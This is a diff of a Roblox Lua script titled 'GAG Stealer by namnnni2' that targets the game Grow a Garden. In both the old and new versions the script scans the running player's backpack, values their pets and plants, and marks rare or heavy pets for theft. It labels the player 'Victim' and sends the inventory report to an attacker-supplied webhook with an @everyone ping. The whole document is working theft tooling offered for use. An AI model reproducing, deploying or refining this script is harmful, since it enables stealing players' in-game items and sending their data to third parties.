@@ -1,47 +1,158 @@
--- ✅ GAG Stealer Full Script (Webhook + Steal + Rare Priority)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+local dataService = require(modules:WaitForChild("DataService"))
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- Config load from external file (loadstring) local webhook = Webhook local usernames = {Username} if webhook == "" then return warn("Missing webhook") end
+local backpack = plr:WaitForChild("Backpack")
+local character = plr.Character or plr.CharacterAdded:Wait()
 
--- Services & modules local Players = game:GetService("Players") local HttpService = game:GetService("HttpService") local plr = Players.LocalPlayer local backpack = plr:WaitForChild("Backpack") local rep = game:GetService("ReplicatedStorage") local modules = rep:WaitForChild("Modules")
+-- Lấy từ settings ngoài
+local webhook = Webhook
+local users = {Username}
 
-local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue")) local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities")) local petRegistry = require(rep:WaitForChild("Data"):WaitForChild("PetRegistry")) local numberUtil = require(modules:WaitForChild("NumberUtil")) local dataService = require(modules:WaitForChild("DataService"))
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+local itemsToSend = {}
+local totalValue = 0
+local hasRare = false
+local hasHeavy = false
 
--- Rare pets config local rarePets = { "Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox" }
-
--- State tracking local totalVal, invCount = 0, 0 local itemsToSend, fullInv = {}, {} local ping = false
-
--- Pet value calculation local function calcPetValue(pet) local egg = pet.PetData.HatchedFrom if not egg or egg == "" then return 0 end local eggData = petRegistry.PetEggs[egg] if not eggData then return 0 end local rarity = eggData.RarityData.Items[pet.PetType] if not rarity then return 0 end local range = rarity.GeneratedPetData.WeightRange if not range then return 0 end local l = numberUtil.ReverseLerp(range[1], range[2], pet.PetData.BaseWeight) local w = math.lerp(0.8, 1.2, l) local lvl = math.lerp(0.15, 6, petUtils:GetLevelProgress(pet.PetData.Level)) return math.floor(petRegistry.PetList[pet.PetType].SellPrice * w * lvl) end
-
--- Weight parsing local function getWeight(name) local s = name:match("%[(%d+%.?%d*) ?KG%]") return tonumber(s) or 0 end
-
--- Collect inventory data for _, tool in ipairs(backpack:GetChildren()) do if tool:IsA("Tool") then invCount += 1 local entry = {Type="Plant", Name=tool.Name}
-
-if tool:GetAttribute("ItemType") == "Pet" then
-  local pet = dataService:GetData().PetsData.PetInventory.Data[tool:GetAttribute("PET_UUID")]
-  entry.Type = "Pet"
-  entry.Name = pet.PetType
-  entry.Value = calcPetValue(pet)
-  entry.Weight = getWeight(tool.Name)
-
-  if table.find(rarePets, entry.Name) or entry.Weight >= 10 then
-    ping = true
-    table.insert(itemsToSend, entry)
-  end
-else
-  entry.Value = calcPlantValue(tool)
+local function formatNumber(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 and suffixIndex < #suffixes do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	if suffixIndex == 1 then
+		return tostring(math.floor(number))
+	else
+		return string.format("%.2f%s", number, suffixes[suffixIndex])
+	end
 end
 
-totalVal += (entry.Value or 0)
-table.insert(fullInv, entry)
+local function getWeight(tool)
+	local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
+	if weightValue then
+		return tonumber(weightValue.Value) or 0
+	end
+	local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+	return tonumber(match) or 0
+end
 
-end end
+local function calcPetValue(petData)
+	local hatchedFrom = petData.PetData.HatchedFrom
+	if not hatchedFrom then return 0 end
+	local eggData = petRegistry.PetEggs[hatchedFrom]
+	if not eggData then return 0 end
+	local rarityData = eggData.RarityData.Items[petData.PetType]
+	if not rarityData then return 0 end
+	local weightRange = rarityData.GeneratedPetData.WeightRange
+	local ratio = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
+	local scale = math.lerp(0.8, 1.2, ratio)
+	local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
+	local finalMultiplier = scale * math.lerp(0.15, 6, levelProgress)
+	local basePrice = petRegistry.PetList[petData.PetType].SellPrice
+	return math.floor(basePrice * finalMultiplier)
+end
 
-if #fullInv == 0 then return end
+for _, tool in ipairs(backpack:GetChildren()) do
+	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+		if tool:GetAttribute("ItemType") == "Pet" then
+			local uuid = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
+			local petName = petData.PetType
+			local value = calcPetValue(petData)
+			local weight = getWeight(tool)
 
--- Sort by rare priority table.sort(itemsToSend, function(a, b) local ar = table.find(rarePets, a.Name) local br = table.find(rarePets, b.Name) if ar and not br then return true elseif br and not ar then return false end return (a.Value or 0) > (b.Value or 0) end)
+			if table.find(rarePets, petName) then hasRare = true end
+			if weight >= 10 then hasHeavy = true end
 
--- Build webhook message local fields = { {name = "Victim", value = plr.Name, inline = true}, {name = "Inventory Items", value = tostring(invCount), inline = true}, {name = "Stealable Items", value = tostring(#itemsToSend), inline = true}, {name = "Total Value", value = "\226\130\162" .. tostring(totalVal), inline = false}, { name = "\240\159\145\146 Full Inventory", value = (function() local a = {} for _, e in ipairs(fullInv) do table.insert(a, ("[%s] %s - \226\130\162%s"):format(e.Type, e.Name, e.Value or 0)) end local txt = table.concat(a, "\n") return #txt > 1024 and txt:sub(1, 1000) .. "\n... and more" or txt end)(), inline = false }, { name = "\240\159\148\175 Items to Steal", value = (function() if #itemsToSend == 0 then return "None" end local a = {} for _, e in ipairs(itemsToSend) do table.insert(a, ("[%s] %s - \226\130\162%s"):format(e.Type, e.Name, e.Value or 0)) end local txt = table.concat(a, "\n") return #txt > 1024 and txt:sub(1, 1000) .. "\n... and more" or txt end)(), inline = false } }
+			totalValue += value
+			table.insert(itemsToSend, {
+				Name = petName,
+				Weight = weight,
+				Value = value,
+				Type = "Pet"
+			})
+		else
+			local value = calcPlantValue(tool)
+			local weight = getWeight(tool)
+			local itemName = tool:GetAttribute("ItemName") or tool.Name
 
-local payload = { content = ping and "@everyone" or "", embeds = {{ title = "\240\159\148\172 GAG Stealer", color = 65280, fields = fields, footer = {text = "GAG stealer"} }} }
+			totalValue += value
+			table.insert(itemsToSend, {
+				Name = itemName,
+				Weight = weight,
+				Value = value,
+				Type = "Plant"
+			})
+		end
+	end
+end
 
--- Send webhook request({ Url = webhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
+table.sort(itemsToSend, function(a, b)
+	if a.Type == "Pet" and b.Type ~= "Pet" then
+		return true
+	elseif a.Type ~= "Pet" and b.Type == "Pet" then
+		return false
+	else
+		return a.Value > b.Value
+	end
+end)
+
+local contentPrefix = ""
+if hasRare or hasHeavy then
+	contentPrefix = "@everyone "
+end
+
+local itemLines = ""
+for _, item in ipairs(itemsToSend) do
+	itemLines = itemLines .. string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
+end
+
+if #itemLines > 1024 then
+	itemLines = itemLines:sub(1, 1010) .. "\n...more items"
+end
+
+local data = {
+	content = contentPrefix,
+	embeds = {{
+		title = "🎯 Full Inventory Report",
+		color = 65280,
+		fields = {
+			{
+				name = "Victim:",
+				value = plr.Name,
+				inline = true
+			},
+			{
+				name = "Total Value:",
+				value = "₵" .. formatNumber(totalValue),
+				inline = true
+			},
+			{
+				name = "Item List:",
+				value = itemLines
+			}
+		},
+		footer = {
+			text = "GAG Stealer by namnnni2"
+		}
+	}}
+}
+
+pcall(function()
+	http_request({
+		Url = webhook,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode(data)
+	})
+end)
